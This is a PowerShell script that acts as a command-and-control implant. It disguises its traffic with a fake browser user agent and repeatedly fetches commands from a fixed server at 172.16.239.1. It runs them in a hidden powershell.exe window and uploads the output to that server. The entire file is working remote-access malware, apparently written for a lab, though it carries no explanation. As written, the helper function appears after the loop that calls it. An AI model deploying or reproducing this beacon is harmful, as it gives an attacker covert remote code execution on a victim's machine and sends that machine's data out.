$wc = New-Object -TypeName System.Net.WebClient

$wc.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)")
$wc.Headers.Add("Content-type", "application/x-www-form-urlencoded")
$wc.Headers.Add("Accept", "text/plain")

$sleep = 2

while ($True) {
    $command = $wc.DownloadString('http://172.16.239.1:80/')
    if ($command) {
        if ($command -like "checkin") {
            $results = "Checking in..."
        } elseif ($command -like "sleep *") {
            $sleep = $command.split(' ')[1]
            $results = "Sleep updated to $sleep"
        } else {
            $results = Execute-Powershell $command
        }
        $wc.UploadString('http://172.16.239.1:80/index.aspx', "POST", $results)
        $command = $results = [string]::empty
    }
    Start-Sleep -Seconds $sleep
}

function Execute-Powershell ($command) {
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "powershell.exe"
    $startInfo.Arguments = $command, $null

    $startInfo.RedirectStandardOutput = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo
    $process.Start() | Out-Null
    $standardOut = $process.StandardOutput.ReadToEnd()
    $process.WaitForExit()

    return $standardOut
}
